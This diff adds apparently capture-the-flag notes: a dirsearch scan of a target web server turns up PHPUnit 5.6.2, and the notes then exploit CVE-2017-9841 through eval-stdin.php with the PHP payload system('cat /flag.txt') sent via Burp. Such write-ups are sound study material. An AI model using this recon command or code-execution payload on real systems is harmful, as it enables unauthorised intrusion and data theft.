@@ -1,0 +1,9 @@
+./dirsearch.py -u http://34.141.12.127:32017 -w ./db/dicc.txt
+with this we can check files and directories of the webpage
+/composer.json we are able to find the version of "php-unit"
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php seems like a vulnerable path 
+version "5.6.2" is vulnerable
+CVE-2017-9841
+we can try "exploiting" the vulnerable path mentioned above with burpsuite to get a response
+<?php system('cat /flag.txt')?>
+flag!
